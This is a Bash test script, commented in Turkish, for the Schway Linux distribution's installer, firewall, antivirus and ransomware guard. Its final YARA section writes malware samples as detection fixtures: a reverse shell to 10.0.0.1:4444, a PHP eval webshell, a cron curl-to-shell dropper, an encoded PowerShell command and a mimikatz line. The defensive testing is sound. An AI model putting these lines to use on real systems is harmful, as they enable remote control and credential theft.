#!/bin/bash
# Schway otomatik testleri. Çalıştır:  bash tests/run.sh
# Gerçek ISO derlemeden yakalanabilen hataları yakalar: söz dizimi, tutarlılık, yapılandırma üreticileri, sunucu.
cd "$(dirname "$0")/.." || exit 1
A=airootfs
BIN=$A/usr/local/bin
PASS=0; FAIL=0; SKIP=0
ok()   { PASS=$((PASS+1)); printf '  ok    %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); printf '  HATA  %s\n' "$1"; }
skip() { SKIP=$((SKIP+1)); printf '  atla  %s\n' "$1"; }
section() { printf '\n== %s\n' "$1"; }

# Kabuk betiklerinin listesi (shebang'ine göre)
mapfile -t SHELLS < <(grep -rlE '^#!/bin/(ba)?sh|^#!/usr/bin/env (ba)?sh' "$BIN" "$A/etc/calamares/schway" ./*.sh ci repo tests 2>/dev/null | sort)

section "Kabuk söz dizimi (bash -n)"
for f in "${SHELLS[@]}"; do bash -n "$f" 2>/dev/null && ok "$f" || bad "$f söz dizimi hatası"; done

section "shellcheck (uyarı ve üstü)"
if command -v shellcheck >/dev/null; then
    for f in "${SHELLS[@]}"; do shellcheck -S warning "$f" >/dev/null 2>&1 && ok "$f" || { bad "$f"; shellcheck -S warning -f gcc "$f" | head -5; }; done
else skip "shellcheck kurulu değil (pip install shellcheck-py)"; fi

section "JSON dosyaları"
for f in feedback-center/config.json feedback-center/package.json "$A/etc/schway/feedback.json" feedback-app/src-tauri/tauri.conf.json; do
    node -e "JSON.parse(require('fs').readFileSync(process.argv[1],'utf8'))" "$f" 2>/dev/null && ok "$f" || bad "$f geçersiz JSON"
done

section "Paket listeleri"
for f in packages.extra packages.full; do
    d=$(grep -v '^#' "$f" | grep -v '^$' | sort | uniq -d | tr '\n' ' ')
    [ -z "$d" ] && ok "$f: yinelenen paket yok" || bad "$f: yinelenen paket: $d"
done
for p in hyprlock hypridle cryptsetup clamav quickshell plymouth; do
    grep -qx "$p" packages.extra && ok "packages.extra: $p var" || bad "packages.extra: $p eksik"
done

section "systemd birimleri"
for f in "$A"/etc/systemd/system/*.service; do
    while read -r line; do
        cmd=${line#*=}; cmd=${cmd#[-@+!]}; cmd=${cmd%% *}
        case "$cmd" in
            /usr/local/bin/*) [ -f "$A$cmd" ] && ok "$(basename "$f"): $cmd" || bad "$(basename "$f"): $cmd yok" ;;
            /usr/bin/*|/bin/*|/usr/sbin/*) ok "$(basename "$f"): sistem komutu $cmd" ;;
            *) bad "$(basename "$f"): bilinmeyen yol $cmd" ;;
        esac
    done < <(grep -E '^Exec(Start|StartPre|StartPost|Stop|StopPost)=' "$f")
done

section "Hyprland kısayolları ve IPC"
targets=$(grep -ohE 'target: "[a-z]+"' "$A"/etc/skel/.config/quickshell/*.qml | cut -d'"' -f2)
for t in $(grep -oE 'qs ipc call [a-z]+' "$A/etc/skel/.config/hypr/hyprland.conf" | awk '{print $4}' | sort -u); do
    echo "$targets" | grep -qx "$t" && ok "IPC hedefi var: $t" || bad "hyprland.conf 'qs ipc call $t' ama hiçbir .qml'de IpcHandler yok"
done
for c in $(grep -oE '(exec(-once)? = |, exec, )(sh -c ..)?schway-[a-z-]+' "$A/etc/skel/.config/hypr/hyprland.conf" | grep -oE 'schway-[a-z-]+' | sort -u); do
    [ -f "$BIN/$c" ] || [ "$c" = schway-feedback ] && ok "komut var: $c" || bad "hyprland.conf $c çağırıyor ama betik yok"
done

section "QML: qmldir ve parantez dengesi"
while read -r _ _ file; do
    [ -f "$A/etc/skel/.config/quickshell/$file" ] && ok "qmldir: $file" || bad "qmldir $file dosyasını gösteriyor ama yok"
done < <(grep '^singleton' "$A/etc/skel/.config/quickshell/qmldir")
python3 - "$A/etc/skel/.config/quickshell" <<'PY' && ok "tüm .qml dosyalarında {} () [] dengeli" || bad "QML parantez dengesi bozuk"
import sys, glob

def check(src):
    """Tek geçişli ayrıştırıcı: dizgeleri ve yorumları doğru atlar ("trash:///" gibi)."""
    st, i, n = [], 0, len(src)
    pairs = {')': '(', ']': '[', '}': '{'}
    while i < n:
        c = src[i]
        if c in '"\'':
            q = c; i += 1
            while i < n and src[i] != q and src[i] != '\n':
                i += 2 if src[i] == '\\' else 1
        elif src.startswith('//', i):
            while i < n and src[i] != '\n': i += 1
            continue
        elif src.startswith('/*', i):
            j = src.find('*/', i + 2); i = n if j < 0 else j + 1
        elif c == '/' and src[:i].rstrip()[-1:] in '(,=:!&|?':   # regex değişmezi: /'/g gibi
            i += 1
            while i < n and src[i] != '/' and src[i] != '\n':
                i += 2 if src[i] == '\\' else 1
        elif c in '([{': st.append((c, i))
        elif c in ')]}':
            if not st or st.pop()[0] != pairs[c]:
                return 'satır %d: fazladan %s' % (src[:i].count('\n') + 1, c)
        i += 1
    if st: return 'satır %d: kapanmamış %s' % (src[:st[-1][1]].count('\n') + 1, st[-1][0])
    return None

bad = 0
for f in sorted(glob.glob(sys.argv[1] + '/*.qml')):
    r = check(open(f, encoding='utf8').read())
    if r: print('  ->', f, r); bad = 1
sys.exit(bad)
PY

section ".desktop kısayolları"
for f in "$A"/usr/share/applications/*.desktop; do
    e=$(grep -m1 '^Exec=' "$f" | cut -d= -f2- | awk '{print $1}')
    case "$e" in
        schway-*) [ -f "$BIN/$e" ] || [ "$e" = schway-feedback ] && ok "$(basename "$f"): $e" || bad "$(basename "$f"): $e betiği yok" ;;
        *) ok "$(basename "$f"): $e (sistem)" ;;
    esac
done

section "README komut tablosu gerçek komutlarla uyumlu"
for c in $(grep -oE '^\| `schway-[a-z-]+' README.md | tr -d '|` ' | sort -u); do
    [ -f "$BIN/$c" ] || [ "$c" = schway-feedback ] && ok "README: $c" || bad "README'de $c var ama betik yok"
done

section "Derleme hatları (ISO derlemeden yakalanabilen hatalar)"
grep -rnE 'pacman -Sy( |$)' "$BIN" build-iso.sh ci >/dev/null 2>&1 && bad "pacman -Sy (kısmi güncelleme) kullanılıyor; -Syu olmalı" || ok "kısmi güncelleme (pacman -Sy + kurulum) yok"
grep -q 'schway-theme" accent blue --build' build-iso.sh && ok "ISO varsayılan vurgu rengi mavi (arayüzle uyumlu)" || bad "build-iso.sh vurgu rengi mavi değil"
T0=$(mktemp -d); mkdir -p "$T0/p"; printf 'file_permissions=(\n)\n' > "$T0/p/profiledef.sh"
HERE=$PWD WORK=$T0 PROFILE=$T0/p bash -c "$(sed -n '/^PERMS=/,/^sed -i "\/\^file_permissions/p' build-iso.sh)" >/dev/null 2>&1
for f in "$BIN"/*; do
    n=$(basename "$f"); grep -q "\"/usr/local/bin/$n\"" "$T0/p/profiledef.sh" && ok "izin 755 verilecek: $n" || bad "$n için çalıştırma izni üretilmiyor"
done
grep -q '/etc/sudoers.d/schway' "$T0/p/profiledef.sh" && ok "sudoers izni 440" || bad "sudoers izni eksik"
rm -rf "$T0"
HT=$(mktemp -d); SCHWAY_TPL=$PWD/$A/usr/share/schway/theme HOME=$HT bash "$BIN/schway-theme" accent blue --build >/dev/null 2>&1
grep -rqi '5980fa' "$HT/.config" 2>/dev/null && ok "schway-theme accent blue --build mavi dosyalar üretir" || bad "schway-theme blue çıktısında #5980FA yok"
rm -rf "$HT"

section "Calamares / önyükleme betikleri (sahte dosyalarla)"
T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
H="$A/etc/calamares/schway/mkinitcpio-hooks.sh"; B="$A/etc/calamares/schway/boot-extras.sh"
base='HOOKS=(base udev autodetect modconf kms keyboard keymap consolefont block filesystems fsck)'
printf '/dev/mapper/luks-x / btrfs rw 0 0\n' > "$T/fstab.luks"; printf 'UUID=1 / btrfs rw 0 0\n' > "$T/fstab.plain"
echo "$base" > "$T/m1"; MKINITCPIO_CONF=$T/m1 FSTAB=$T/fstab.luks bash "$H" >/dev/null
grep -q 'block encrypt filesystems' "$T/m1" && ok "LUKS kökte encrypt kancası eklenir" || bad "LUKS kökte encrypt eklenmedi"
grep -q 'udev plymouth' "$T/m1" && ok "plymouth udev'den hemen sonra" || bad "plymouth yerinde değil"
echo "$base" > "$T/m2"; MKINITCPIO_CONF=$T/m2 FSTAB=$T/fstab.plain bash "$H" >/dev/null
grep -q encrypt "$T/m2" && bad "düz kökte encrypt eklenmemeliydi" || ok "düz kökte encrypt eklenmez"
echo 'HOOKS=(base udev block encrypt filesystems)' > "$T/m3"; MKINITCPIO_CONF=$T/m3 FSTAB=$T/fstab.luks bash "$H" >/dev/null
[ "$(grep -o encrypt "$T/m3" | wc -l)" = 1 ] && ok "encrypt zaten varsa çiftlenmez" || bad "encrypt çiftlendi"
MKINITCPIO_CONF=$T/m3 FSTAB=$T/fstab.luks bash "$H" >/dev/null
grep -q 'plymouth.*plymouth' "$T/m3" && bad "yeniden çalıştırmada plymouth çiftlendi" || ok "betik tekrar çalıştırılabilir (idempotent)"
echo 'GRUB_TIMEOUT=5' > "$T/g1"; FSTAB=$T/fstab.luks GRUB_DEFAULT_FILE=$T/g1 bash "$B" >/dev/null
grep -q '^GRUB_ENABLE_CRYPTODISK=y' "$T/g1" && ok "LUKS kökte GRUB_ENABLE_CRYPTODISK=y" || bad "GRUB cryptodisk açılmadı"
echo 'GRUB_TIMEOUT=5' > "$T/g2"; FSTAB=$T/fstab.plain GRUB_DEFAULT_FILE=$T/g2 bash "$B" >/dev/null
grep -q CRYPTODISK "$T/g2" && bad "düz kökte cryptodisk açılmamalıydı" || ok "düz kökte cryptodisk açılmaz"

section "Ayarlar arka ucu: boşta kalma / kilit yapılandırması"
HOME=$T/home bash "$BIN/schway-settings" set lock_after 5 >/dev/null 2>&1
HOME=$T/home bash "$BIN/schway-settings" set screen_off 10 >/dev/null 2>&1
HOME=$T/home bash "$BIN/schway-settings" set suspend 30 >/dev/null 2>&1
HI=$T/home/.config/hypr/hypridle.conf
grep -q 'timeout = 300' "$HI" && grep -q 'timeout = 600' "$HI" && grep -q 'timeout = 1800' "$HI" && ok "hypridle.conf: kilit 300, ekran 600, uyku 1800 sn" || bad "hypridle.conf süreleri yanlış"
grep -q 'before_sleep_cmd = schway-lock' "$HI" && ok "uykudan önce kilitler" || bad "before_sleep_cmd yok"
HOME=$T/home bash "$BIN/schway-settings" set lock_after 0 >/dev/null 2>&1
grep -q 'on-timeout = schway-lock' "$HI" && bad "kilit kapatılınca listener kalmamalı" || ok "kilit 'Hiç' olunca listener yazılmaz"
[ "$(HOME=$T/home bash "$BIN/schway-settings" dump lock_after 2>/dev/null)" = "V lock_after 0" ] && ok "dump lock_after" || bad "dump lock_after yanlış"

section "schway-lock güvenlik kapısı"
( PATH="$T/nobin:$PATH"; bash "$BIN/schway-lock" --check ) && bad "hyprlock yokken kilitlenebilir sanıldı" || ok "hyprlock yoksa kilitlemez"
mkdir -p "$T/fake"; printf '#!/bin/sh\nexit 0\n' > "$T/fake/hyprlock"; chmod +x "$T/fake/hyprlock"
printf '#!/bin/sh\necho "x NP 2024-01-01 0 99999 7 -1"\n' > "$T/fake/passwd"; chmod +x "$T/fake/passwd"
( PATH="$T/fake:$PATH"; [ -d /run/archiso ] && exit 2; bash "$BIN/schway-lock" --check ) && bad "parolasız hesap kilitlenebilir sanıldı" || ok "parola yoksa kilitlemez (dışarıda kalma koruması)"
printf '#!/bin/sh\necho "x P 2024-01-01 0 99999 7 -1"\n' > "$T/fake/passwd"
( PATH="$T/fake:$PATH"; [ -d /run/archiso ] && exit 0; bash "$BIN/schway-lock" --check ) && ok "parola varsa kilitler" || bad "parola varken kilitlenemedi"

section "Kullanıcı adı (kurulumda seçilir, sabit 'schway' yok)"
T2=$(mktemp -d)
printf 'root:x:0:0::/root:/bin/bash\nali:x:1001:1001::/home/ali:/bin/bash\n' > "$T2/passwd"
u=$(SCHWAY_PASSWD=$T2/passwd SUDO_USER=ali bash -c ". $A/usr/local/lib/schway-user.sh; schway_user")
[ "$u" = ali ] && ok "schway_user: sudo kullanıcısı" || bad "schway_user yanlış: $u"
u=$(env -u SUDO_USER -u PKEXEC_UID SCHWAY_PASSWD=$T2/passwd bash -c ". $A/usr/local/lib/schway-user.sh; id() { [ \"\$1\" = -u ] && echo 0 || echo root; }; schway_user")
[ "$u" = ali ] && ok "schway_user: kökte ilk gerçek hesap" || bad "schway_user kökte yanlış: $u"
h=$(SCHWAY_PASSWD=$T2/passwd SUDO_USER=ali bash -c ". $A/usr/local/lib/schway-user.sh; schway_home")
[ "$h" = /home/ali ] && ok "schway_home doğru" || bad "schway_home yanlış: $h"
grep -q '^  - users$' "$A/etc/calamares/settings.conf" && [ "$(grep -c '^  - users$' "$A/etc/calamares/settings.conf")" = 2 ] && ok "Calamares: users hem gösterilir hem çalıştırılır" || bad "Calamares users modülü sırada değil"
python3 - "$A/etc/calamares" <<'PY' && ok "Calamares YAML dosyaları geçerli, users.conf docker grubu içermez" || bad "Calamares YAML/users.conf hatalı"
import sys, yaml, glob
for f in glob.glob(sys.argv[1] + '/*.conf') + glob.glob(sys.argv[1] + '/modules/*.conf'):
    yaml.safe_load(open(f, encoding='utf8'))
u = yaml.safe_load(open(sys.argv[1] + '/modules/users.conf', encoding='utf8'))
assert 'docker' not in u['defaultGroups'] and 'wheel' in u['defaultGroups'] and u['setRootPassword'] is False
PY
grep -q 'schway-harden apply' "$A/etc/calamares/modules/shellprocess_cleanup.conf" && grep -q 'autologin.conf' "$A/etc/calamares/modules/shellprocess_cleanup.conf" && ok "kurulumda sudo parolası uygulanır, canlı otomatik giriş kaldırılır" || bad "cleanup adımları eksik"
mkdir -p "$T2/bin" "$T2/share"; cp "$A"/usr/share/schway/sudoers-installed "$A"/usr/share/schway/polkit-installed.rules "$T2/share/"
printf '#!/bin/sh\nexit 0\n' > "$T2/bin/visudo"; printf '#!/bin/sh\necho "ali P 2026-01-01 0 99999 7 -1"\n' > "$T2/bin/passwd"; chmod +x "$T2/bin/"*
sed 's/^\[ "\$EUID" -eq 0 \] || exec sudo.*$/true/' "$BIN/schway-harden" > "$T2/harden"
hrd() { PATH=$T2/bin:$PATH SCHWAY_LIB=$PWD/$A/usr/local/lib SCHWAY_PASSWD=$T2/passwd HARDEN_SHARE=$T2/share HARDEN_SUDOERS=$T2/sudoers HARDEN_RULES=$T2/rules/49.rules HARDEN_MARK=$T2/mark HARDEN_FORCE=1 bash "$T2/harden" "$@"; }
hrd apply >/dev/null 2>&1 && [ -f "$T2/sudoers" ] && [ "$(hrd status)" = on ] && ok "harden apply: parola varken sudo parolaya geçer (kullanıcı ali)" || bad "harden apply çalışmadı"
printf '#!/bin/sh\necho "ali NP 2026-01-01 0 99999 7 -1"\n' > "$T2/bin/passwd"; rm -f "$T2/sudoers" "$T2/mark"
hrd apply >/dev/null 2>&1 && bad "parolasız hesapta harden apply reddetmeliydi" || ok "harden apply: parolasız hesabı reddeder (dışarıda kalma koruması)"
sed 's/^\[ "\$EUID" -eq 0 \] || die.*$/true/' "$BIN/schway-priv" > "$T2/priv"
printf 'root:x:0:0::/root:/bin/bash\nschway:x:1000:1000::/home/schway:/bin/bash\nali:x:1001:1001::/home/ali:/bin/bash\n' > "$T2/passwd2"
pv() { SCHWAY_LIB=$PWD/$A/usr/local/lib SCHWAY_PASSWD=$T2/passwd2 PRIV_GETTY_DIR=$T2/getty PRIV_FW_MARK=$T2/fwmark bash "$T2/priv" "$@"; }
SUDO_USER=schway pv autologin on >/dev/null 2>&1
diff -q "$T2/getty/autologin.conf" "$A/etc/systemd/system/getty@tty1.service.d/autologin.conf" >/dev/null && ok "autologin on: canlı ISO'daki dosyayla birebir aynı çıktı" || bad "autologin dosyası farklı üretildi"
SUDO_USER=ali pv autologin on >/dev/null 2>&1; grep -q -- '--autologin ali ' "$T2/getty/autologin.conf" && ok "autologin: seçilen kullanıcı için yazılır" || bad "autologin ali için yazılmadı"
pv autologin off >/dev/null 2>&1; [ ! -e "$T2/getty/autologin.conf" ] && ok "autologin off: dosya silinir" || bad "autologin off silmedi"
SUDO_USER=zzz pv autologin on >/dev/null 2>&1 && bad "var olmayan kullanıcıya autologin açıldı" || ok "autologin: geçersiz kullanıcıyı reddeder"
grep -q 'schway_has_human' "$BIN/schway-firstboot" && ! grep -q 'if ! id schway' "$BIN/schway-firstboot" && ok "firstboot: gerçek kullanıcı varsa 'schway' hesabı açmaz" || bad "firstboot hâlâ sabit schway arıyor"
for f in schway-update schway-drivers schway-sets schway-harden; do grep -q 'SUDO_USER:-schway}"$' "$BIN/$f" && bad "$f sabit schway'e düşüyor" || ok "$f: kullanıcıyı yardımcıdan alır"; done
mkdir -p "$T2/hm/.config/qt5ct"; cp "$A/etc/skel/.config/qt5ct/qt5ct.conf" "$T2/hm/.config/qt5ct/"
HOME=$T2/hm SCHWAY_TPL=$PWD/$A/usr/share/schway/theme timeout 20 bash "$BIN/schway-theme" apply-session >/dev/null 2>&1
grep -q "color_scheme_path=$T2/hm/.config/qt5ct" "$T2/hm/.config/qt5ct/qt5ct.conf" && ok "Qt yapılandırmasındaki ev yolu gerçek kullanıcıya çevrilir" || bad "qt5ct yolu düzeltilmedi"
rm -rf "$T2"

section "Güvenlik duvarı"
T3=$(mktemp -d); mkdir -p "$T3/bin"
printf '#!/bin/sh\necho "ufw $*" >> "$FWLOG"\n[ "$1" = status ] && echo "Status: active"\nexit 0\n' > "$T3/bin/ufw"; printf '#!/bin/sh\nexit 0\n' > "$T3/bin/systemctl"; chmod +x "$T3/bin/"*
sed 's/^\[ "\$EUID" -eq 0 \] || die.*$/true/' "$BIN/schway-priv" > "$T3/priv"
fw() { PATH=$T3/bin:$PATH FWLOG=$T3/log PRIV_FW_MARK=$T3/mark bash "$T3/priv" "$@"; }
: > "$T3/log"; fw ufw init >/dev/null 2>&1; : > "$T3/log2"
grep -q 'ufw default deny incoming' "$T3/log" && grep -q 'ufw default allow outgoing' "$T3/log" && grep -q 'ufw --force enable' "$T3/log" && ok "ilk açılışta: gelen reddedilir, giden serbest, güvenlik duvarı açılır" || bad "ufw init beklenen komutları çalıştırmadı"
cp "$T3/log" "$T3/log.1"; fw ufw init >/dev/null 2>&1; cmp -s "$T3/log" "$T3/log.1" && ok "ufw init yalnızca bir kez çalışır (kullanıcı kapatırsa tekrar açılmaz)" || bad "ufw init tekrar çalıştı"
: > "$T3/log"; PATH=$T3/bin:$PATH FWLOG=$T3/log bash -c "$(sed -n '/^fw_active()/p;/^fw_server()/,/^}/p' "$T3/priv"); fw_server open"
[ "$(grep -c 'ufw allow' "$T3/log")" = 3 ] && grep -q 'allow 22/tcp' "$T3/log" && grep -q 'allow 443/tcp' "$T3/log" && ok "sunucu başlayınca ssh/web portları açılır" || bad "sunucu portları açılmadı"
: > "$T3/log"; PATH=$T3/bin:$PATH FWLOG=$T3/log bash -c "$(sed -n '/^fw_active()/p;/^fw_server()/,/^}/p' "$T3/priv"); fw_server close"
[ "$(grep -c 'ufw delete allow' "$T3/log")" = 3 ] && ok "sunucu durunca portlar kapatılır" || bad "sunucu portları kapatılmadı"
grep -q 'ufw init' "$BIN/schway-firstboot" && ok "firstboot kurulu sistemde ufw init çağırır" || bad "firstboot ufw init çağırmıyor"
rm -rf "$T3"

section "Antivirüs: İndirme koruması ve kullanıcı yolları"
T4=$(mktemp -d); export T4; mkdir -p "$T4/dl" "$T4/bin"
cat > "$T4/bin/clamdscan" <<'EOS'
#!/bin/bash
f="${@: -1}"
echo "$(basename "$f") $(stat -c %a "$f")" >> "$SCANLOG"
case "$f" in
  *eicar*) echo "$f: Eicar-Test-Signature FOUND"; exit 1 ;;
  *broken*) echo "ERROR: clamd yok"; exit 2 ;;
esac
echo "$f: OK"; exit 0
EOS
chmod +x "$T4/bin/clamdscan"
sed '/^case "\${1:-}" in/,$d' "$BIN/schway-defender" > "$T4/def.sh"
cat > "$T4/t.sh" <<'EOS'
export SD_STATE=$T4/state SD_CONF=$T4/def.conf SD_RUN=$T4/run SD_EXCL=$T4/excl SD_CLAMDSCAN=$T4/bin/clamdscan SD_CLAMD_CONF=$T4/clamd.conf SCANLOG=$T4/scan.log
. $T4/def.sh
init_dirs
D=$T4/dl
printf MZ > $D/setup.exe; chmod 644 $D/setup.exe
printf x > $D/notes.txt; chmod 644 $D/notes.txt
printf x > $D/tool.sh; chmod 755 $D/tool.sh
printf X5O > $D/eicar.zip; chmod 644 $D/eicar.zip
printf x > $D/broken.pdf; chmod 600 $D/broken.pdf
printf x > $D/film.mkv.part; chmod 644 $D/film.mkv.part
printf x > $D/skip.exe; chmod 644 $D/skip.exe; echo "$D/skip.exe" > $EXCL
ln -s $D/setup.exe $D/link.exe
for f in setup.exe notes.txt tool.sh eicar.zip broken.pdf film.mkv.part skip.exe link.exe; do guard_handle "$D/$f"; done
EOS
: > "$T4/scan.log"; bash "$T4/t.sh" >/dev/null 2>&1
grep -q '^setup.exe 0$' "$T4/scan.log" && grep -q '^tool.sh 0$' "$T4/scan.log" && ok "riskli dosya taranırken erişime kapalı (mod 000)" || bad "riskli dosya bekletilmedi"
! grep -q 'notes.txt\|film.mkv.part\|skip.exe\|link.exe' "$T4/scan.log" && ok "zararsız tür, .part, dışlanan ve sembolik bağ bekletilmez/taranmaz" || bad "gereksiz dosya tarandı"
[ "$(stat -c %a "$T4/dl/setup.exe")" = 644 ] && [ "$(stat -c %a "$T4/dl/tool.sh")" = 755 ] && [ "$(stat -c %a "$T4/dl/broken.pdf")" = 600 ] && ok "temiz dosyanın eski izni geri verilir" || bad "izin geri verilmedi"
[ ! -e "$T4/dl/eicar.zip" ] && cut -f6 "$T4/state/quarantine.tsv" | grep -q '^644$' && ok "tehdit karantinaya alınır ve ÖZGÜN izin kaydedilir (000 değil)" || bad "karantina ya da izin kaydı hatalı"
grep -q 'tarama yapılamadı' "$T4/state/history.tsv" && ok "tarama hatasında dosya açılır, olay kaydedilir (clamd çökerse indirmeler kilitli kalmaz)" || bad "tarama hatası kaydedilmedi"
[ -z "$(ls "$T4/state/guard" 2>/dev/null)" ] && ok "bekleyen kilit kaydı kalmaz" || bad "hold kaydı kaldı"
printf 'x' > "$T4/dl/crash.exe"; chmod 000 "$T4/dl/crash.exe"; mkdir -p "$T4/state/guard"; printf '%s\t644\n' "$T4/dl/crash.exe" > "$T4/state/guard/aaaa.hold"
cat > "$T4/t2.sh" <<'EOS'
export SD_STATE=$T4/state SD_CONF=$T4/def.conf SD_RUN=$T4/run SD_EXCL=$T4/excl SD_CLAMDSCAN=$T4/bin/clamdscan SCANLOG=$T4/scan.log
. $T4/def.sh
guard_recover
EOS
bash "$T4/t2.sh" >/dev/null 2>&1; [ "$(stat -c %a "$T4/dl/crash.exe")" = 644 ] && ok "çökmeden sonra kilitli kalan dosya kurtarılır" || bad "guard_recover izni geri vermedi"
printf 'OnAccessIncludePath /home/schway/Downloads\nOnAccessIncludePath /home/schway/Desktop\nOnAccessIncludePath /tmp\nScanPDF yes\n' > "$T4/clamd.conf"
printf 'root:x:0:0::/root:/bin/bash\nali:x:1001:1001::/home/ali:/bin/bash\n' > "$T4/passwd"
cat > "$T4/t3.sh" <<'EOS'
export SD_STATE=$T4/state SD_CONF=$T4/def.conf SD_CLAMD_CONF=$T4/clamd.conf
. $T4/def.sh
main_user() { echo ali; }; user_home() { echo /home/ali; }
sync_clamd_paths
EOS
bash "$T4/t3.sh" >/dev/null 2>&1
grep -q '^OnAccessIncludePath /home/ali/Downloads$' "$T4/clamd.conf" && grep -q '^OnAccessIncludePath /tmp$' "$T4/clamd.conf" && ok "clamd.conf izlenen yollar gerçek kullanıcıya çevrilir, /tmp'ye dokunulmaz" || bad "clamd.conf yolları çevrilmedi"
grep -q 'cfg_guard' "$BIN/schway-defender" && grep -q 'guard) echo 1' "$BIN/schway-defender" && ok "guard ayarı varsayılan açık ve durum çıktısında" || bad "guard ayarı eksik"
grep -qx inotify-tools packages.extra && ok "inotify-tools paket listesinde" || bad "inotify-tools eksik"
rm -rf "$T4"

section "Fidye yazılımı koruması"
T6=$(mktemp -d); export T6; mkdir -p "$T6/docs" "$T6/state"
sed '/^case "\${1:-}" in/,$d' "$BIN/schway-defender" > "$T6/def.sh"
cat > "$T6/run.sh" <<'EOS'
export SD_STATE=$T6/state SD_CONF=$T6/def.conf SD_RUN=$T6/run SD_RANSOM_DIRS=$T6/docs SD_RANSOM_MAX=10 SD_RANSOM_WIN=5 SD_RANSOM_COOLDOWN=1
. $T6/def.sh
ransom_main
EOS
grep -q 'ransom) echo 1' "$BIN/schway-defender" && grep -q 'cfg_ransom' "$BIN/schway-defender" && ok "fidye koruması varsayılan açık ve durum çıktısında" || bad "ransom ayarı eksik"
[ -f "$A/etc/systemd/system/schway-defender-ransom.service" ] && grep -q '_ransom' "$A/etc/systemd/system/schway-defender-ransom.service" && ok "fidye koruması systemd birimi var" || bad "ransom birimi eksik"
grep -q 'key: "av_ransom"' "$A/etc/skel/.config/quickshell/SettingsPages.qml" && grep -q 'cfg_ransom' "$A/etc/skel/.config/quickshell/Security.qml" && ok "fidye koruması Ayarlar ve Güvenlik uygulamasında" || bad "ransom arayüz anahtarı eksik"
if command -v inotifywait >/dev/null 2>&1; then
    rw() { local i; for i in $(seq 1 40); do eval "$1" && return 0; sleep 0.25; done; return 1; }   # rw 'koşul': en çok 10 sn bekler
    hn() { grep -c "$1" "$T6/state/history.tsv" 2>/dev/null; }
    setsid nohup bash "$T6/run.sh" > "$T6/out.log" 2>&1 < /dev/null &
    C="$T6/docs/.~schway-canary.docx"
    rw '[ -f "$C" ]' && ok "tuzak dosya yerleştirilir" || bad "tuzak dosya yok"
    sleep 1
    for i in 1 2 3; do echo x > "$T6/docs/n$i.txt"; done; sleep 1.5
    [ ! -s "$T6/state/history.tsv" ] && ok "normal kullanım (3 dosya) uyarı vermez" || bad "yanlış alarm"
    echo hi >> "$C"
    rw '[ "$(hn "Tuzak dosya")" -ge 1 ]' && ok "tuzak dosya değişince uyarı kaydedilir" || bad "tuzak değişimi algılanmadı"
    rw '! grep -q "^hi$" "$C"' && ok "değiştirilen tuzak dosya onarılır" || bad "tuzak onarılmadı"
    sleep 3.5; rm -f "$C"
    rw '[ "$(hn "Tuzak dosya")" -ge 2 ]' && rw '[ -f "$C" ]' && ok "silinen tuzak dosya uyarı verir ve yeniden konur" || bad "tuzak silme algılanmadı"
    sleep 2; for i in $(seq 1 12); do echo x > "$T6/docs/f$i.txt"; done
    rw '[ "$(hn "dosya değişti")" -ge 1 ]' && ok "kısa sürede çok dosya değişince uyarı" || bad "toplu değişiklik algılanmadı"
    sleep 2; for i in 1 2 3 4 5 6; do echo x > "$T6/docs/a$i.locked"; done
    rw '[ "$(hn "Şüpheli uzantılı")" -ge 1 ]' && ok "şüpheli uzantılı (.locked) dosyalar uyarı verir" || bad "şüpheli uzantı algılanmadı"
    sleep 2; echo x > "$T6/docs/HOW_TO_DECRYPT.txt"; echo x > "$T6/docs/sub_DECRYPT_files.txt"
    rw '[ "$(hn "Fidye notuna")" -ge 1 ]' && ok "fidye notu adlı dosyalar uyarı verir" || bad "fidye notu algılanmadı"
    grep -q '^last_ransom_time=' "$T6/state/state" && ok "son alarm durum dosyasına yazılır" || bad "last_ransom_time yazılmadı"
    kill $(pgrep -x inotifywait) 2>/dev/null
else
    skip "inotify-tools kurulu değil, fidye koruması çalışma testi atlandı"
fi
rm -rf "$T6"

section "YARA kuralları (ClamAV motoruyla)"
YR="$A/var/lib/clamav/schway-rules.yar"
grep -c '^rule ' "$YR" | grep -qE '^[0-9]+$' && [ "$(grep -c '^rule ' "$YR")" -ge 8 ] && ok "en az 8 YARA kuralı var" || bad "YARA kuralı sayısı az"
if command -v clamscan >/dev/null 2>&1; then
    T8=$(mktemp -d); mkdir -p "$T8/db" "$T8/pos" "$T8/neg"; cp "$YR" "$T8/db/"
    printf '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "$T8/pos/reverse_shell.sh"
    printf '<?php eval(base64_decode($_POST["x"])); ?>' > "$T8/pos/webshell.php"
    printf 'stratum+tcp://pool.example:3333\nxmrig --donate-level 1\n' > "$T8/pos/miner.cfg"
    printf 'Your files have been encrypted. Pay bitcoin to get the private key to decrypt.' > "$T8/pos/ransom_note.txt"
    printf '(crontab -l; echo "* * * * * curl -s http://x/a | sh") | crontab -' > "$T8/pos/cron_dropper.sh"
    printf 'powershell -WindowStyle Hidden -EncodedCommand AAA; IEX x' > "$T8/pos/ps_downloader.txt"
    printf 'mimikatz # sekurlsa::logonpasswords' > "$T8/pos/mimikatz.txt"
    printf 'stratum+tcp://p:1\n"algo": "rx/0"\nrandomx\n' > "$T8/pos/miner_config.json"
    printf 'exec 3<>/dev/tcp/localhost/80 || true\n' > "$T8/neg/tcp_check.sh"
    printf 'Bitcoin makalesi. Decrypt etmek icin anahtar gerekir.' > "$T8/neg/article.txt"
    printf 'crontab -l\n' > "$T8/neg/cron_list.sh"
    printf 'curl -s https://example.com | sh\n' > "$T8/neg/install.sh"
    printf 'powershell -NoProfile -File x.ps1' > "$T8/neg/ps.txt"
    printf '<?php echo htmlspecialchars($_POST["x"]); ?>' > "$T8/neg/form.php"
    printf 'randomx is a proof of work algorithm' > "$T8/neg/paper.txt"
    printf 'notes: xmrig is popular' > "$T8/neg/xmrig_note.txt"
    out=$(clamscan -d "$T8/db" --no-summary "$T8/pos" 2>&1)
    miss=0; for f in "$T8"/pos/*; do grep -q "$(basename "$f"): YARA.*FOUND" <<<"$out" || { miss=1; bad "yakalanmadı: $(basename "$f")"; }; done
    [ $miss = 0 ] && ok "8 zararlı kalıp örneği yakalanır (ters kabuk, webshell, madenci x2, fidye notu, cron, PowerShell, mimikatz)" || true
    out=$(clamscan -d "$T8/db" --no-summary "$T8/neg" 2>&1)
    ! grep -q FOUND <<<"$out" && ok "tek ipucu içeren 8 zararsız dosya yakalanmaz (yanlış alarm yok)" || bad "yanlış alarm: $(grep FOUND <<<"$out")"
